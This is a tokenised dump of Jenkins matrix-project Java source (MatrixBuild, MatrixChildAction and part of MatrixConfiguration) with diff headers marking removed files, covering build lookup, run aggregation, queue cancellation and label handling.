"}", "/", "**", "*", "Returns", "the", "base", "{", "@", "link", "MatrixBuild", "}", "that", "this", "build", "originates", "from", ".", "*", "<", "p", ">", "*", "If", "this", "build", "is", "a", "partial", "build", ",", "unexecuted", "{", "@", "link", "MatrixRun", "}", "s", "are", "delegated", "to", "this", "build", "number", ".", "*", "/", "public", "MatrixBuild", "getBaseBuild", "(", ")", "{", "return", "baseBuild", "=", "=", "null", "?", "getPreviousBuild", "(", ")", ":", "getParent", "(", ").", "getBuildByNumber", "(", "baseBuild", ")", ";", "}", "/", "**", "*", "Gets", "the", "{", "@", "link", "MatrixRun", "}", "in", "this", "build", "that", "corresponds", "*", "to", "the", "given", "combination", ".", "*", "/", "public", "MatrixRun", "getRun", "(", "Combination", "c", ")", "{", "MatrixConfiguration", "config", "=", "getParent", "(", ").", "getItem", "(", "c", ")", ";", "if", "(", "config", "=", "=", "null", ")", "return", "null", ";", "return", "getRunForConfiguration", "(", "config", ")", ";", "}", "/", "**", "*", "Like", "{", "@", "link", "#", "getRun", "(", "Combination", ")", "},", "but", "do", "not", "approximate", "the", "result", "by", "earlier", "execution", "*", "of", "the", "given", "combination", "(", "which", "is", "done", "for", "partial", "rebuild", "of", "the", "matrix", ".", ")", "*", "/", "public", "MatrixRun", "getExactRun", "(", "Combination", "c", ")", "{", "MatrixConfiguration", "config", "=", "getParent", "(", ").", "getItem", "(", "c", ")", ";", "if", "(", "config", "=", "=", "null", ")", "return", "null", ";", "return", "config", ".", "getBuildByNumber", "(", "getNumber", "(", "))", ";", "}", "/", "**", "*", "Returns", "all", "{", "@", "link", "MatrixRun", "}", "s", "for", "this", "{", "@", "link", "MatrixBuild", "}", ".", "*", "/", "@", "Exported", "public", "List", "<", "MatrixRun", ">", "getRuns", "(", ")", "{", "List", "<", "MatrixRun", ">", "r", "=", "new", "ArrayList", "<", "MatrixRun", ">", "()", ";", "for", "(", "MatrixConfiguration", "c", ":", "getParent", "(", ").", "getItems", "(", "))", "{", "MatrixRun", "b", "=", "getRunForConfiguration", "(", "c", ")", ";", "if", "(", "b", "!", "=", "null", ")", "r", ".", "add", "(", "b", ")", ";", "}", "return", "r", ";", "}", "private", "MatrixRun", "getRunForConfiguration", "(", "MatrixConfiguration", "c", ")", "{", "for", "(", "MatrixBuild", "b", "=", "this", ";", "b", "!", "=", "null", ";", "b", "=", "b", ".", "getBaseBuild", "(", "))", "{", "MatrixRun", "r", "=", "c", ".", "getBuildByNumber", "(", "b", ".", "getNumber", "(", "))", ";", "if", "(", "r", "!", "=", "null", ")", "return", "r", ";", "}", "return", "null", ";", "}", "/", "**", "*", "Returns", "all", "{", "@", "link", "MatrixRun", "}", "s", "for", "exactly", "this", "{", "@", "link", "MatrixBuild", "}", ".", "*", "<", "p", ">", "*", "Unlike", "{", "@", "link", "#", "getRuns", "(", ")}", ",", "this", "method", "excludes", "those", "runs", "*", "that", "didn", "'", "t", "run", "and", "got", "inherited", ".", "*", "@", "since", "1", ".", "413", "*", "/", "public", "List", "<", "MatrixRun", ">", "getExactRuns", "(", ")", "{", "List", "<", "MatrixRun", ">", "r", "=", "new", "ArrayList", "<", "MatrixRun", ">", "()", ";", "for", "(", "MatrixConfiguration", "c", ":", "getParent", "(", ").", "getItems", "(", "))", "{", "MatrixRun", "b", "=", "c", ".", "getBuildByNumber", "(", "getNumber", "(", "))", ";", "if", "(", "b", "!", "=", "null", ")", "r", ".", "add", "(", "b", ")", ";", "}", "return", "r", ";", "}", "@", "Override", "public", "String", "getWhyKeepLog", "(", ")", "{", "MatrixBuild", "b", "=", "getNextBuild", "(", ");", "if", "(", "isLinkedBy", "(", "b", ")", ")", "return", "Messages", ".", "MatrixBuild_depends_on_this", "(", "b", ".", "getDisplayName", "(", "))", ";", "return", "super", ".", "getWhyKeepLog", "(", ");", "}", "/", "**", "*", "@", "return", "True", "if", "another", "{", "@", "link", "MatrixBuild", "}", "build", "(", "passed", "as", "a", "parameter", ")", "depends", "on", "this", "build", ".", "*", "@", "since", "1", ".", "481", "*", "/", "public", "boolean", "isLinkedBy", "(", "MatrixBuild", "b", ")", "{", "if", "(", "null", "=", "=", "b", ")", "return", "false", ";", "for", "(", "MatrixConfiguration", "c", ":", "b", ".", "getParent", "(", ").", "getActiveConfigurations", "(", "))", "{", "MatrixRun", "r", "=", "c", ".", "getNearestOldBuild", "(", "b", ".", "getNumber", "(", "))", ";", "if", "(", "r", "!", "=", "null", "&", "&", "r", ".", "getNumber", "(", ")=", "=", "getNumber", "(", "))", "return", "true", ";", "}", "return", "false", ";", "}", "/", "**", "*", "True", "if", "this", "build", "didn", "'", "t", "do", "a", "full", "build", "and", "it", "is", "depending", "on", "the", "result", "of", "the", "previous", "build", ".", "*", "/", "public", "boolean", "isPartial", "(", ")", "{", "for", "(", "MatrixConfiguration", "c", ":", "getParent", "(", ").", "getActiveConfigurations", "(", "))", "{", "MatrixRun", "b", "=", "c", ".", "getNearestOldBuild", "(", "getNumber", "(", "))", ";", "if", "(", "b", "!", "=", "null", "&", "&", "b", ".", "getNumber", "(", ")!", "=", "getNumber", "(", "))", "return", "true", ";", "}", "return", "false", ";", "}", "@", "Override", "public", "Object", "getDynamic", "(", "String", "token", ",", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "{", "try", "{", "MatrixRun", "item", "=", "getRun", "(", "Combination", ".", "fromString", "(", "token", ")", ");", "if", "(", "item", "!", "=", "null", ")", "{", "if", "(", "item", ".", "getNumber", "(", ")=", "=", "this", ".", "getNumber", "(", "))", "return", "item", ";", "else", "{", "/", "/", "redirect", "the", "user", "to", "the", "correct", "URL", "String", "url", "=", "Functions", ".", "joinPath", "(", "item", ".", "getUrl", "(", "),", "req", ".", "getRestOfPath", "(", "))", ";", "String", "qs", "=", "req", ".", "getQueryString", "(", ");", "if", "(", "qs", "!", "=", "null", ")", "url", "+", "='", "?'", "+", "qs", ";", "throw", "HttpResponses", ".", "redirectViaContextPath", "(", "url", ")", ";", "}", "}", "}", "catch", "(", "IllegalArgumentException", "_", ")", "{", "/", "/", "failed", "to", "parse", "the", "token", "as", "Combination", ".", "Must", "be", "something", "else", "}", "return", "super", ".", "getDynamic", "(", "token", ",", "req", ",", "rsp", ")", ";", "}", "@", "Override", "public", "void", "run", "(", ")", "{", "execute", "(", "new", "MatrixBuildExecution", "(", "))", ";", "}", "@", "Override", "public", "Fingerprint", ".", "RangeSet", "getDownstreamRelationship", "(", "AbstractProject", "that", ")", "{", "Fingerprint", ".", "RangeSet", "rs", "=", "super", ".", "getDownstreamRelationship", "(", "that", ")", ";", "for", "(", "MatrixRun", "run", ":", "getRuns", "(", "))", "rs", ".", "add", "(", "run", ".", "getDownstreamRelationship", "(", "that", ")", ");", "return", "rs", ";", "}", "/", "**", "*", "Object", "that", "lives", "from", "the", "start", "of", "{", "@", "link", "MatrixBuild", "}", "execution", "to", "its", "end", ".", "*", "*", "Used", "to", "keep", "track", "of", "things", "that", "are", "needed", "only", "during", "the", "build", ".", "*", "/", "public", "class", "MatrixBuildExecution", "extends", "AbstractBuildExecution", "{", "private", "final", "List", "<", "MatrixAggregator", ">", "aggregators", "=", "new", "ArrayList", "<", "MatrixAggregator", ">", "()", ";", "private", "Set", "<", "MatrixConfiguration", ">", "activeConfigurations", ";", "/", "**", "*", "Snapshot", "of", "{", "@", "link", "MatrixProject", "#", "getActiveConfigurations", "(", ")}", "to", "ensure", "*", "that", "the", "build", "will", "use", "a", "consistent", "view", "of", "it", ".", "*", "/", "public", "Set", "<", "MatrixConfiguration", ">", "getActiveConfigurations", "(", ")", "{", "return", "activeConfigurations", ";", "}", "/", "**", "*", "Aggregators", "attached", "to", "this", "build", "execution", ",", "that", "are", "notified", "*", "of", "every", "start", "/", "end", "of", "{", "@", "link", "MatrixRun", "}", ".", "*", "/", "public", "List", "<", "MatrixAggregator", ">", "getAggregators", "(", ")", "{", "return", "aggregators", ";", "}", "protected", "Result", "doRun", "(", "BuildListener", "listener", ")", "throws", "Exception", "{", "MatrixProject", "p", "=", "getProject", "(", ");", "PrintStream", "logger", "=", "listener", ".", "getLogger", "(", ");", "/", "/", "give", "axes", "a", "chance", "to", "rebuild", "themselves", "activeConfigurations", "=", "p", ".", "rebuildConfigurations", "(", "this", ")", ";", "/", "/", "list", "up", "aggregators", "listUpAggregators", "(", "p", ".", "getPublishers", "(", ").", "values", "(", "))", ";", "listUpAggregators", "(", "p", ".", "getProperties", "(", ").", "values", "(", "))", ";", "listUpAggregators", "(", "p", ".", "getBuildWrappers", "(", ").", "values", "(", "))", ";", "axes", "=", "p", ".", "getAxes", "(", ");", "try", "{", "return", "p", ".", "getExecutionStrategy", "(", ").", "run", "(", "this", ")", ";", "}", "catch", "(", "InterruptedException", "e", ")", "{", "logger", ".", "println", "(", "\"", "Aborted", "\"", ");", "Executor", "x", "=", "Executor", ".", "currentExecutor", "(", ");", "x", ".", "recordCauseOfInterruption", "(", "MatrixBuild", ".", "this", ",", "listener", ")", ";", "return", "x", ".", "abortResult", "(", ");", "}", "catch", "(", "AbortException", "e", ")", "{", "logger", ".", "println", "(", "e", ".", "getMessage", "(", "))", ";", "return", "Result", ".", "FAILURE", ";", "}", "finally", "{", "/", "/", "if", "the", "build", "was", "aborted", "in", "the", "middle", ".", "Cancel", "all", "the", "configuration", "builds", ".", "Queue", "q", "=", "Jenkins", ".", "getInstance", "(", ").", "getQueue", "(", ");", "synchronized", "(", "q", ")", "{", "//", "avoid", "micro", "-", "locking", "in", "q", ".", "cancel", ".", "final", "int", "n", "=", "getNumber", "(", ");", "for", "(", "MatrixConfiguration", "c", ":", "activeConfigurations", ")", "{", "for", "(", "Item", "i", ":", "q", ".", "getItems", "(", "c", ")", ")", "{", "ParentBuildAction", "a", "=", "i", ".", "getAction", "(", "ParentBuildAction", ".", "class", ")", ";", "if", "(", "a", "!", "=", "null", "&", "&", "a", ".", "parent", "=", "=", "getBuild", "(", "))", "{", "q", ".", "cancel", "(", "i", ")", ";", "logger", ".", "println", "(", "Messages", ".", "MatrixBuild_Cancelled", "(", "ModelHyperlinkNote", ".", "encodeTo", "(", "c", ")", "))", ";", "}", "}", "MatrixRun", "b", "=", "c", ".", "getBuildByNumber", "(", "n", ")", ";", "if", "(", "b", "!", "=", "null", "&", "&", "b", ".", "isBuilding", "(", "))", "{", "//", "executor", "can", "spend", "some", "time", "in", "post", "production", "state", ",", "so", "only", "cancel", "in", "-", "progress", "builds", ".", "Executor", "exe", "=", "b", ".", "getExecutor", "(", ");", "if", "(", "exe", "!", "=", "null", ")", "{", "logger", ".", "println", "(", "Messages", ".", "MatrixBuild_Interrupting", "(", "ModelHyperlinkNote", ".", "encodeTo", "(", "b", ")", "))", ";", "exe", ".", "interrupt", "(", ");", "}", "}", "}", "}", "}", "}", "private", "void", "listUpAggregators", "(", "Collection", "<", "?>", "values", ")", "{", "for", "(", "Object", "v", ":", "values", ")", "{", "if", "(", "v", "instanceof", "MatrixAggregatable", ")", "{", "MatrixAggregatable", "ma", "=", "(", "MatrixAggregatable", ")", "v", ";", "MatrixAggregator", "a", "=", "ma", ".", "createAggregator", "(", "MatrixBuild", ".", "this", ",", "launcher", ",", "listener", ")", ";", "if", "(", "a", "!", "=", "null", ")", "aggregators", ".", "add", "(", "a", ")", ";", "}", "}", "}", "public", "void", "post2", "(", "BuildListener", "listener", ")", "throws", "Exception", "{", "for", "(", "MatrixAggregator", "a", ":", "aggregators", ")", "a", ".", "endBuild", "(", ");", "}", "}", "}", "@", "@", "-", "1", ",", "39", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2012", ",", "Chris", "Johnson", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "model", ".", "Action", ";", "import", "hudson", ".", "model", ".", "Queue", ";", "import", "hudson", ".", "model", ".", "Queue", ".", "Task", ";", "/", "**", "*", "Optional", "interface", "for", "{", "@", "link", "Action", "}", "s", "that", "are", "used", "as", "parameters", "*", "to", "{", "@", "link", "Queue", "#", "schedule", "(", "Task", ",", "int", ",", "Action", ".", "..", ")}", "to", "indicate", "that", "they", "*", "want", "to", "be", "also", "passed", "to", "the", "{", "@", "link", "MatrixRun", "}", "s", "from", "its", "parent", "{", "@", "link", "MatrixBuild", "}", ".", "*", "*", "@", "author", "Chris", "Johnson", "*", "@", "since", "1", ".", "481", "*", "/", "public", "interface", "MatrixChildAction", "extends", "Action", "{", "}", "@", "@", "-", "1", ",", "432", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Tom", "Huybrechts", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "EnvVars", ";", "import", "hudson", ".", "Util", ";", "import", "hudson", ".", "model", ".", "Action", ";", "import", "hudson", ".", "model", ".", "Executor", ";", "import", "hudson", ".", "model", ".", "InvisibleAction", ";", "import", "hudson", ".", "model", ".", "Node", ";", "import", "hudson", ".", "model", ".", "Queue", ".", "QueueAction", ";", "import", "hudson", ".", "model", ".", "TaskListener", ";", "import", "hudson", ".", "util", ".", "AlternativeUiTextProvider", ";", "import", "hudson", ".", "util", ".", "DescribableList", ";", "import", "hudson", ".", "model", ".", "AbstractBuild", ";", "import", "hudson", ".", "model", ".", "Cause", ";", "import", "hudson", ".", "model", ".", "CauseAction", ";", "import", "hudson", ".", "model", ".", "DependencyGraph", ";", "import", "hudson", ".", "model", ".", "Descriptor", ";", "import", "jenkins", ".", "model", ".", "BuildDiscarder", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "hudson", ".", "model", ".", "Item", ";", "import", "hudson", ".", "model", ".", "ItemGroup", ";", "import", "hudson", ".", "model", ".", "JDK", ";", "import", "hudson", ".", "model", ".", "Label", ";", "import", "hudson", ".", "model", ".", "ParametersAction", ";", "import", "hudson", ".", "model", ".", "Project", ";", "import", "hudson", ".", "model", ".", "SCMedItem", ";", "import", "hudson", ".", "model", ".", "Queue", ".", "NonBlockingTask", ";", "import", "hudson", ".", "model", ".", "Cause", ".", "LegacyCodeCause", ";", "import", "hudson", ".", "scm", ".", "SCM", ";", "import", "jenkins", ".", "scm", ".", "SCMCheckoutStrategy", ";", "import", "hudson", ".", "tasks", ".", "BuildWrapper", ";", "import", "hudson", ".", "tasks", ".", "Builder", ";", "import", "hudson", ".", "tasks", ".", "LogRotator", ";", "import", "hudson", ".", "tasks", ".", "Publisher", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "/", "**", "*", "One", "configuration", "of", "{", "@", "link", "MatrixProject", "}", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "MatrixConfiguration", "extends", "Project", "<", "MatrixConfiguration", ",", "MatrixRun", ">", "implements", "SCMedItem", ",", "NonBlockingTask", "{", "/", "**", "*", "The", "actual", "value", "combination", ".", "*", "/", "private", "transient", "/", "*", "final", "*", "/", "Combination", "combination", ";", "/", "**", "*", "Hash", "value", "of", "{", "@", "link", "#", "combination", "}", ".", "Cached", "for", "efficiency", ".", "*", "/", "private", "transient", "String", "digestName", ";", "public", "MatrixConfiguration", "(", "MatrixProject", "parent", ",", "Combination", "c", ")", "{", "super", "(", "parent", ",", "c", ".", "toString", "(", "))", ";", "setCombination", "(", "c", ")", ";", "}", "@", "Override", "public", "void", "onLoad", "(", "ItemGroup", "<", "?", "extends", "Item", ">", "parent", ",", "String", "name", ")", "throws", "IOException", "{", "/", "/", "directory", "name", "is", "not", "a", "name", "for", "us", "-", "--", "it", "'", "s", "taken", "from", "the", "combination", "name", "super", ".", "onLoad", "(", "parent", ",", "combination", ".", "toString", "(", "))", ";", "}", "@", "Override", "public", "EnvVars", "getEnvironment", "(", "Node", "node", ",", "TaskListener", "listener", ")", "throws", "IOException", ",", "InterruptedException", "{", "EnvVars", "env", "=", "super", ".", "getEnvironment", "(", "node", ",", "listener", ")", ";", "AxisList", "axes", "=", "getParent", "(", ").", "getAxes", "(", ");", "for", "(", "Map", ".", "Entry", "<", "String", ",", "String", ">", "e", ":", "getCombination", "(", ").", "entrySet", "(", "))", "{", "Axis", "a", "=", "axes", ".", "find", "(", "e", ".", "getKey", "(", "))", ";", "if", "(", "a", "!", "=", "null", ")", "a", ".", "addBuildVariable", "(", "e", ".", "getValue", "(", "),", "env", ")", ";", "/", "/", "TODO", ":", "hijacking", "addBuildVariable", "but", "perhaps", "we", "need", "addEnvVar", "?", "else", "env", ".", "put", "(", "e", ".", "getKey", "(", "),", "e", ".", "getValue", "(", "))", ";", "}", "return", "env", ";", "}", "@", "Override", "protected", "void", "updateTransientActions", "(", "){", "/", "/", "This", "method", "is", "exactly", "the", "same", "as", "in", "{", "@", "link", "#", "AbstractProject", "}", ".", "/", "/", "Enabling", "to", "call", "this", "method", "from", "MatrixProject", "is", "the", "only", "reason", "for", "overriding", ".", "super", ".", "updateTransientActions", "(", ");", "}", "@", "Override", "public", "boolean", "isConcurrentBuild", "(", ")", "{", "return", "getParent", "(", ").", "isConcurrentBuild", "(", ");", "}", "@", "Override", "public", "void", "setConcurrentBuild", "(", "boolean", "b", ")", "throws", "IOException", "{", "throw", "new", "UnsupportedOperationException", "(", "\"", "The", "setting", "can", "be", "only", "changed", "at", "MatrixProject", "\"", ");", "}", "/", "**", "*", "Used", "during", "loading", "to", "set", "the", "combination", "back", ".", "*", "/", "/", "*", "package", "*", "/", "void", "setCombination", "(", "Combination", "c", ")", "{", "this", ".", "combination", "=", "c", ";", "this", ".", "digestName", "=", "c", ".", "digest", "(", ").", "substring", "(", "0", ",", "8", ")", ";", "}", "/", "**", "*", "Build", "numbers", "are", "always", "synchronized", "with", "the", "parent", ".", "*", "*", "<", "p", ">", "*", "Computing", "this", "is", "bit", "tricky", ".", "Several", "considerations", ":", "*", "*", "<", "ol", ">", "*", "<", "li", ">", "A", "new", "configuration", "build", "#", "N", "is", "started", "while", "the", "parent", "build", "#", "N", "is", "building", ",", "*", "and", "when", "that", "happens", "we", "want", "to", "return", "N", ".", "*", "<", "li", ">", "But", "the", "configuration", "build", "#", "N", "is", "done", "before", "the", "parent", "build", "#", "N", "finishes", ",", "*", "and", "when", "that", "happens", "we", "want", "to", "return", "N", "+", "1", "because", "that", "'", "s", "going", "to", "be", "the", "next", "one", ".", "*", "<", "li", ">", "Configuration", "builds", "might", "skip", "some", "numbers", "if", "the", "parent", "build", "is", "aborted", "*", "before", "this", "configuration", "is", "built", ".", "*", "<", "li", ">", "If", "nothing", "is", "building", "right", "now", "and", "the", "last", "build", "of", "the", "parent", "is", "#", "N", ",", "*", "then", "we", "want", "to", "return", "N", "+", "1", ".", "*", "<", "/", "ol", ">", "*", "/", "@", "Override", "public", "int", "getNextBuildNumber", "(", ")", "{", "AbstractBuild", "<", "?,", "?>", "lb", "=", "getParent", "(", ").", "getLastBuild", "(", ");", "while", "(", "lb", "!", "=", "null", "&", "&", "lb", ".", "isBuilding", "(", "))", "{", "lb", "=", "lb", ".", "getPreviousBuild", "(", ");", "}", "if", "(", "lb", "=", "=", "null", ")", "return", "0", ";", "int", "n", "=", "lb", ".", "getNumber", "(", ")+", "1", ";", "lb", "=", "getLastBuild", "(", ");", "if", "(", "lb", "!", "=", "null", ")", "n", "=", "Math", ".", "max", "(", "n", ",", "lb", ".", "getNumber", "(", ")+", "1", ")", ";", "return", "n", ";", "}", "@", "Override", "public", "int", "assignBuildNumber", "(", ")", "throws", "IOException", "{", "int", "nb", "=", "getNextBuildNumber", "(", ");", "MatrixRun", "r", "=", "getLastBuild", "(", ");", "if", "(", "r", "!", "=", "null", "&", "&", "r", ".", "getNumber", "(", ")>", "=", "nb", ")", "/", "/", "make", "sure", "we", "don", "'", "t", "schedule", "the", "same", "build", "twice", "throw", "new", "IllegalStateException", "(", "\"", "Build", "#", "\"+", "nb", "+", "\"", "is", "already", "completed", "\"", ");", "return", "nb", ";", "}", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "combination", ".", "toCompactString", "(", "getParent", "(", ").", "getAxes", "(", "))", ";", "}", "@", "Override", "public", "MatrixProject", "getParent", "(", ")", "{", "return", "(", "MatrixProject", ")", "super", ".", "getParent", "(", ");", "}", "/", "**", "*", "Get", "the", "actual", "combination", "of", "the", "axes", "values", "for", "this", "{", "@", "link", "MatrixConfiguration", "}", "*", "/", "public", "Combination", "getCombination", "(", ")", "{", "return", "combination", ";", "}", "/", "**", "*", "Since", "{", "@", "link", "MatrixConfiguration", "}", "is", "always", "invoked", "from", "{", "@", "link", "MatrixRun", "}", "*", "once", "and", "just", "once", ",", "there", "'", "s", "no", "point", "in", "having", "a", "quiet", "period", ".", "*", "/", "@", "Override", "public", "int", "getQuietPeriod", "(", ")", "{", "return", "0", ";", "}", "/", "**", "*", "Inherit", "the", "value", "from", "the", "parent", ".", "*", "/", "@", "Override", "public", "int", "getScmCheckoutRetryCount", "(", ")", "{", "return", "getParent", "(", ").", "getScmCheckoutRetryCount", "(", ");", "}", "/", "**", "*", "Inherit", "the", "value", "from", "the", "parent", ".", "*", "/", "@", "Override", "public", "SCMCheckoutStrategy", "getScmCheckoutStrategy", "(", ")", "{", "return", "getParent", "(", ").", "getScmCheckoutStrategy", "(", ");", "}", "@", "Override", "public", "boolean", "isConfigurable", "(", ")", "{", "return", "false", ";", "}", "@", "Override", "protected", "Class", "<", "MatrixRun", ">", "getBuildClass", "(", ")", "{", "return", "MatrixRun", ".", "class", ";", "}", "@", "Override", "protected", "MatrixRun", "newBuild", "(", ")", "throws", "IOException", "{", "List", "<", "Action", ">", "actions", "=", "Executor", ".", "currentExecutor", "(", ").", "getCurrentWorkUnit", "(", ").", "context", ".", "actions", ";", "MatrixBuild", "lb", "=", "getParent", "(", ").", "getLastBuild", "(", ");", "for", "(", "Action", "a", ":", "actions", ")", "{", "if", "(", "a", "instanceof", "ParentBuildAction", ")", "{", "MatrixBuild", "_lb", "=", "(", "(", "ParentBuildAction", ")", "a", ")", ".", "parent", ";", "if", "(", "_lb", "!", "=", "null", ")", "{", "lb", "=", "_lb", ";", "}", "}", "}", "if", "(", "lb", "=", "=", "null", ")", "{", "throw", "new", "IOException", "(", "\"", "cannot", "start", "a", "build", "of", "\"", "+", "getFullName", "(", ")", "+", "\"", "since", "its", "parent", "has", "no", "builds", "at", "all", "\"", ");", "}", "/", "/", "for", "every", "MatrixRun", "there", "should", "be", "a", "parent", "MatrixBuild", "MatrixRun", "lastBuild", "=", "new", "MatrixRun", "(", "this", ",", "lb", ".", "getTimestamp", "(", "))", ";", "lastBuild", ".", "number", "=", "lb", ".", "getNumber", "(", ");", "builds", ".", "put", "(", "lastBuild", ")", ";", "return", "lastBuild", ";", "}", "@", "Override", "protected", "void", "buildDependencyGraph", "(", "DependencyGraph", "graph", ")", "{", "}", "@", "Override", "public", "MatrixConfiguration", "asProject", "(", ")", "{", "return", "this", ";", "}", "@", "Override", "public", "Label", "getAssignedLabel", "(", ")", "{", "/", "/", "combine", "all", "the", "label", "axes", "by", "&", "&.", "String", "expr", ";", "String", "exprSlave", "=", "Util", ".", "join", "(", "combination", ".", "values", "(", "getParent", "(", ").", "getAxes", "(", ").", "subList", "(", "LabelAxis", ".", "class", ")", "),", "\"", "&&", "\")", ";", "String", "exprLabel", "=", "Util", ".", "join", "(", "combination", ".", "values", "(", "getParent", "(", ").", "getAxes", "(", ").", "subList", "(", "LabelExpAxis", ".", "class", ")", "),", "\"", "&&", "\")", ";", "if", "(", "!", "exprSlave", ".", "equals", "(", "\"\"", ")", "&", "&", "!", "exprLabel", ".", "equals", "(", "\"\"", "))", "{", "expr", "=", "exprSlave", "+", "\"", "&&", "\"", "+", "exprLabel", ";", "}", "else", "{", "expr", "=", "(", "exprSlave", ".", "equals", "(", "\"\"", "))", "?", "exprLabel", ":", "exprSlave", ";", "}", "return", "Jenkins", ".", "getInstance", "(", ").", "getLabel", "(", "Util", ".", "fixEmpty", "(", "expr", ")", ");", "}", "@", "Override", "public", "String", "getPronoun", "(", ")", "{", "return", "AlternativeUiTextProvider", ".", "get", "(", "PRONOUN", ",", "this", ",", "Messages", ".", "MatrixConfiguration_Pronoun", "(", "))", ";", "}", "@", "Override", "public", "JDK", "getJDK", "(", ")", "{", "return", "Jenkins", ".", "getInstance", "(", ").", "getJDK", "(", "combination", ".", "get", "(", "\"", "jdk", "\"", "))", ";", "}", "/", "/", "/", "/", "inherit", "build", "setting", "from", "the", "parent", "project", "/", "/", "@", "Override", "public", "List", "<", "Builder", ">", "getBuilders", "(", ")", "{", "return", "getParent", "(", ").", "getBuilders", "(", ");", "}", "@", "Override", "public", "Map", "<", "Descriptor", "<", "Publisher", ">", ",", "Publisher", ">", "getPublishers", "(", ")", "{", "return", "getParent", "(", ").", "getPublishers", "(", ");", "}", "@", "Override", "public", "DescribableList", "<", "Builder", ",", "Descriptor", "<", "Builder", ">", ">", "getBuildersList", "(", ")", "{", "return", "getParent", "(", ").", "getBuildersList", "(", ");", "}", "@", "Override", "public", "DescribableList", "<", "Publisher", ",", "Descriptor", "<", "Publisher", ">", ">", "getPublishersList", "(", ")", "{", "return", "getParent", "(", ").", "getPublishersList", "(", ");", "}", "@", "Override", "public", "Map", "<", "Descriptor", "<", "BuildWrapper", ">", ",", "BuildWrapper", ">", "getBuildWrappers", "(", ")", "{", "return", "getParent", "(", ").", "getBuildWrappers", "(", ");", "}", "@", "Override", "public", "DescribableList", "<", "BuildWrapper", ",", "Descriptor", "<", "BuildWrapper", ">", ">", "getBuildWrappersList", "(", ")", "{", "return", "getParent", "(", ").", "getBuildWrappersList", "(", ");", "}", "@", "Override", "public", "Publisher", "getPublisher", "(", "Descriptor", "<", "Publisher", ">", "descriptor", ")", "{", "return", "getParent", "(", ").", "getPublisher", "(", "descriptor", ")", ";", "}", "@", "Override", "public", "BuildDiscarder", 